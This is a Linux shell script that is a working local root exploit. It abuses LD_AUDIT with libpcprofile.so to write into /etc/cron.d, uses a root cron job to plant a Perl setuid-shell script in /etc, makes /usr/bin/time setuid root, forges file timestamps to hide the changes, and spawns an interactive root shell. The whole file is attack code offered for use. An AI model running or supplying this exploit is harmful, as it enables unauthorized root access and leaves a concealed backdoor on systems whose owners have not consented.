#!/bin/sh

# A cleaner implementation of: http://www.exploit-db.com/papers/15311/
# This script uses Perl as a setuid() provider, but any lang will do

CRONTAB=`date +%s`
BASETMP=`mktemp`
LOADER=${BASETMP}.sh
ROOTPL="${CRONTAB}.pl"

rm -f ${BASETMP}
touch ${LOADER}

PERL=`which perl`

if [ ! -f ${PERL} ]; then
 echo "[*] This exploit requires the perl interpreter"
 exit
fi

umask 0
LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/${CRONTAB}" ping >/dev/null 2>&1
umask 22

if [ ! -f /etc/cron.d/${CRONTAB} ]; then 
 echo "[*] This system is not vulnerable"
 exit
fi

echo "* * * * * root /bin/bash ${LOADER}" > /etc/cron.d/${CRONTAB}

echo "[*] Created cron entry as /etc/cron.d/${CRONTAB}..."

echo "rm -f /etc/cron.d/${CRONTAB}" > ${LOADER}
echo "rm -f ${LOADER}" >> ${LOADER}
echo "echo '#!${PERL}' > /etc/${ROOTPL}" >> ${LOADER}
echo "echo '\$< = \$> = \$( = \$) = 0;' >> /etc/${ROOTPL}" >> ${LOADER}
echo "echo 'undef %ENV; %ENV = (\"PATH\" => \"/bin:/usr/bin:/usr/sbin:/sbin\");' >> /etc/${ROOTPL}" >> $LOADER
echo "echo 'system(\"/bin/bash -i\")' >> /etc/${ROOTPL}" >> ${LOADER}

echo "chmod 755 /etc/${ROOTPL}" >> ${LOADER}
echo "touch -r /usr/bin/time /etc/${ROOTPL}" >> ${LOADER}
echo "chmod 4755 /usr/bin/time" >> ${LOADER}
echo "touch -r /etc/${ROOTPL} /usr/bin/time" >> ${LOADER}
chmod 755 ${LOADER}

echo "[*] Waiting for the cronjob to execute..."
while [ ! -f /etc/${ROOTPL} ]; do sleep 5; echo "    >> "`date`; done
echo ""
echo "[*] Remember to remove the backdoor"
echo "     # chmod -s /usr/bin/time"
echo "     # rm -f /etc/${ROOTPL}"
echo ""

echo ""
echo "[*] Spawning our root shell..."
echo ""

/usr/bin/time ${PERL} /etc/${ROOTPL}

